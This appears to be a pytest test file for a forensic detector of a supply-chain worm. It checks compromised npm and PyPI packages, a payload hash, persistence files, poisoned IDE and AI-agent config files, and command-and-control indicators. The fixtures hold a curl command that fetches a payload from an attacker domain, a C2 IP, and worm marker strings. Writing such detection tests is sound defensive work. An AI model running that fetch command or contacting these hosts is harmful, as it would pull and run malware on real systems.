"""MiniShaiHuludDetector — TeamPCP supply-chain worm (May 2026)."""

from __future__ import annotations

import pytest

from digger.core.evidence import Artifact, EvidenceStore
from digger.detectors.mini_shai_hulud import MiniShaiHuludDetector


def _store(tmp_path):
    return EvidenceStore(tmp_path / "evidence.db")


# ---- S1 compromised packages ----------------------------------------- #


@pytest.mark.parametrize("pkg", [
    "@tanstack/react-router",
    "@tanstack/vue-router",
    "@mistralai/mistralai",
    "@opensearch-project/opensearch",
])
def test_npm_compromised_package_critical(tmp_path, pkg):
    store = _store(tmp_path)
    store.add_artifact(Artifact(
        collector="npm_packages", category="inventory",
        subject="npm:/proj/x",
        data={"project": "/proj/x",
              "locked_packages": {pkg: "1.0.0"}},
    ))
    findings = list(MiniShaiHuludDetector().detect(store))
    hits = [f for f in findings if f.evidence.get("kind") == "npm_compromised"]
    assert hits, [f.title for f in findings]
    assert hits[0].severity == "critical"
    assert hits[0].mitre == "T1195.002"
    assert pkg in (hits[0].evidence.get("package") or "")
    store.close()


def test_uipath_scope_wildcard_match(tmp_path):
    """The @uipath/* entry is a scope wildcard — any package under
    that scope should fire."""
    store = _store(tmp_path)
    store.add_artifact(Artifact(
        collector="npm_packages", category="inventory",
        subject="npm:/proj/ui",
        data={"project": "/proj/ui",
              "locked_packages": {"@uipath/some-random-pkg": "0.1.0"}},
    ))
    findings = list(MiniShaiHuludDetector().detect(store))
    hits = [f for f in findings if f.evidence.get("kind") == "npm_compromised"]
    assert hits
    store.close()


def test_clean_npm_not_flagged(tmp_path):
    store = _store(tmp_path)
    store.add_artifact(Artifact(
        collector="npm_packages", category="inventory",
        subject="npm:/proj/safe",
        data={"project": "/proj/safe",
              "locked_packages": {"react": "18.0.0", "lodash": "4.17.21"}},
    ))
    findings = list(MiniShaiHuludDetector().detect(store))
    assert not [f for f in findings if f.evidence.get("kind") == "npm_compromised"]
    store.close()


def test_pypi_compromised_exact_version(tmp_path):
    store = _store(tmp_path)
    store.add_artifact(Artifact(
        collector="python_packages", category="inventory",
        subject="pip:/usr/bin/python3",
        data={
            "interpreter": "/usr/bin/python3",
            "entries": [
                {"name": "guardrails-ai", "version": "0.10.1"},
                {"name": "requests", "version": "2.31.0"},
            ],
        },
    ))
    findings = list(MiniShaiHuludDetector().detect(store))
    hits = [f for f in findings if f.evidence.get("kind") == "pypi_compromised"]
    assert len(hits) == 1
    assert "guardrails-ai" in (hits[0].evidence.get("package") or "")
    store.close()


def test_pypi_safe_version_not_flagged(tmp_path):
    """guardrails-ai==0.10.0 is legitimate; only 0.10.1 is compromised."""
    store = _store(tmp_path)
    store.add_artifact(Artifact(
        collector="python_packages", category="inventory",
        subject="pip:/usr/bin/python3",
        data={
            "interpreter": "/usr/bin/python3",
            "entries": [{"name": "guardrails-ai", "version": "0.10.0"}],
        },
    ))
    findings = list(MiniShaiHuludDetector().detect(store))
    assert not [f for f in findings if f.evidence.get("kind") == "pypi_compromised"]
    store.close()


# ---- S2 payload hash --------------------------------------------------- #


_ROUTER_INIT_HASH = "ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c"


def test_process_exe_sha256_match_critical(tmp_path):
    store = _store(tmp_path)
    store.add_artifact(Artifact(
        collector="processes", category="process",
        subject="pid=1 node",
        data={"pid": 1, "ppid": 1, "name": "node", "exe": "/usr/bin/node",
              "exe_sha256": _ROUTER_INIT_HASH,
              "cmdline": ["node"], "username": "u",
              "connections": [], "open_files": []},
    ))
    findings = list(MiniShaiHuludDetector().detect(store))
    hits = [f for f in findings if f.evidence.get("kind") == "payload_hash"]
    assert hits, [f.title for f in findings]
    assert hits[0].severity == "critical"
    store.close()


def test_file_on_disk_sha256_match(tmp_path):
    store = _store(tmp_path)
    store.add_artifact(Artifact(
        collector="recent_files", category="filesystem",
        subject="recent:/tmp",
        data={
            "location": "/tmp",
            "entries": [
                {"path": "/tmp/.malware/router_init.js", "size": 2200000,
                 "sha256": _ROUTER_INIT_HASH},
            ],
        },
    ))
    findings = list(MiniShaiHuludDetector().detect(store))
    hits = [f for f in findings if f.evidence.get("kind") == "payload_hash"]
    assert hits
    store.close()


# ---- S3 persistence (gh-token-monitor) -------------------------------- #


@pytest.mark.parametrize("path", [
    "/Users/dev/Library/LaunchAgents/com.user.gh-token-monitor.plist",
    "/home/dev/.config/systemd/user/gh-token-monitor.service",
])
def test_persistence_file_critical(tmp_path, path):
    store = _store(tmp_path)
    store.add_artifact(Artifact(
        collector="recent_files", category="filesystem",
        subject="recent:/persistence",
        data={"location": "/persistence",
              "entries": [{"path": path, "size": 512}]},
    ))
    findings = list(MiniShaiHuludDetector().detect(store))
    hits = [f for f in findings if f.evidence.get("kind") == "persistence_file"]
    assert hits, [f.title for f in findings]
    assert hits[0].severity == "critical"
    # destructive_warning must appear in evidence
    assert "DESTRUCTIVE" in (hits[0].evidence.get("destructive_warning") or "").upper()
    assert hits[0].mitre == "T1543"
    store.close()


# ---- S4 IDE poison ---------------------------------------------------- #


@pytest.mark.parametrize("name", [
    ".claude/settings.json", ".vscode/tasks.json", ".claude/setup.mjs",
])
def test_ide_poison_with_marker_critical(tmp_path, name):
    store = _store(tmp_path)
    store.add_artifact(Artifact(
        collector="recent_files", category="filesystem",
        subject="recent:/proj",
        data={
            "location": "/proj",
            "entries": [
                {"path": f"/home/dev/myproj/{name}",
                 "size": 4096,
                 "contents": "// loader = tanstack_runner.js;"},
            ],
        },
    ))
    findings = list(MiniShaiHuludDetector().detect(store))
    hits = [f for f in findings if f.evidence.get("kind") == "ide_poison"]
    assert hits
    assert "tanstack_runner.js" in (hits[0].evidence.get("marker") or "").lower()
    store.close()


def test_clean_claude_config_not_flagged(tmp_path):
    """A normal .claude/settings.json without markers is NOT a hit."""
    store = _store(tmp_path)
    store.add_artifact(Artifact(
        collector="recent_files", category="filesystem",
        subject="recent:/proj",
        data={
            "location": "/proj",
            "entries": [
                {"path": "/home/dev/myproj/.claude/settings.json",
                 "size": 256,
                 "contents": '{"model": "claude-opus-4"}'},
            ],
        },
    ))
    findings = list(MiniShaiHuludDetector().detect(store))
    assert not [f for f in findings if f.evidence.get("kind") == "ide_poison"]
    store.close()


# ---- S5 marker in cmdline ------------------------------------------- #


@pytest.mark.parametrize("marker", [
    "Shai-Hulud: Here We Go Again",
    "IfYouRevokeThisTokenItWillWipeTheComputerOfTheOwner",
    "With Love TeamPCP",
    "gh-token-monitor",
    "tanstack_runner.js",
    "router_init.js",
    "router_runtime.js",
])
def test_marker_in_cmdline_critical(tmp_path, marker):
    store = _store(tmp_path)
    store.add_artifact(Artifact(
        collector="processes", category="process",
        subject="pid=5 node",
        data={"pid": 5, "ppid": 1, "name": "node", "exe": "/usr/bin/node",
              "cmdline": ["node", "-e", f"console.log('{marker}')"],
              "username": "u", "connections": [], "open_files": []},
    ))
    findings = list(MiniShaiHuludDetector().detect(store))
    hits = [f for f in findings if f.evidence.get("kind") == "marker_cmdline"
            and f.evidence.get("marker") == marker]
    assert hits, [f.title for f in findings]
    store.close()


# ---- S6 C2 callouts -------------------------------------------------- #


def test_c2_domain_in_cmdline(tmp_path):
    store = _store(tmp_path)
    store.add_artifact(Artifact(
        collector="processes", category="process",
        subject="pid=10 curl",
        data={"pid": 10, "ppid": 1, "name": "curl", "exe": "/usr/bin/curl",
              "cmdline": ["curl", "https://git-tanstack.com/transformers.pyz"],
              "username": "u", "connections": [], "open_files": []},
    ))
    findings = list(MiniShaiHuludDetector().detect(store))
    hits = [f for f in findings if f.evidence.get("kind") == "c2_cmdline"]
    assert hits
    assert "git-tanstack.com" == hits[0].evidence.get("domain")
    store.close()


def test_c2_ip_in_connection_table(tmp_path):
    store = _store(tmp_path)
    store.add_artifact(Artifact(
        collector="processes", category="process",
        subject="pid=11 node",
        data={"pid": 11, "ppid": 1, "name": "node", "exe": "/usr/bin/node",
              "cmdline": ["node"], "username": "u", "open_files": [],
              "connections": [{"raddr": "83.142.209.194", "rport": 443,
                               "status": "ESTABLISHED"}]},
    ))
    findings = list(MiniShaiHuludDetector().detect(store))
    hits = [f for f in findings if f.evidence.get("kind") == "c2_connection"]
    assert hits
    assert "83.142.209.194" == hits[0].evidence.get("remote_ip")
    store.close()


def test_c2_dns_resolution(tmp_path):
    store = _store(tmp_path)
    store.add_artifact(Artifact(
        collector="dns", category="network",
        subject="dns:cache",
        data={"host": "filev2.getsession.org", "entries": []},
    ))
    findings = list(MiniShaiHuludDetector().detect(store))
    hits = [f for f in findings if f.evidence.get("kind") == "c2_dns"]
    assert hits
    store.close()


# ---- mitigation routing ---------------------------------------------- #


def test_destructive_warning_in_every_finding(tmp_path):
    store = _store(tmp_path)
    store.add_artifact(Artifact(
        collector="npm_packages", category="inventory",
        subject="npm:/proj/x",
        data={"project": "/proj/x",
              "locked_packages": {"@tanstack/react-router": "1.169.5"}},
    ))
    findings = list(MiniShaiHuludDetector().detect(store))
    for f in findings:
        assert f.evidence.get("destructive_warning"), f.title
        assert "rm -rf" in (f.evidence.get("destructive_warning") or "")


# ---- Sigma + registration ------------------------------------------- #


def test_sigma_template_present():
    tpl = MiniShaiHuludDetector().to_sigma_template()
    assert tpl is not None
    assert tpl["level"] == "critical"
    assert "attack.t1195.002" in tpl["tags"]
    assert "attack.t1485" in tpl["tags"]  # destructive
    assert "attack.t1543" in tpl["tags"]  # persistence


def test_detector_registered():
    from digger.detectors import all_detectors
    assert "mini_shai_hulud" in [d.name for d in all_detectors()]
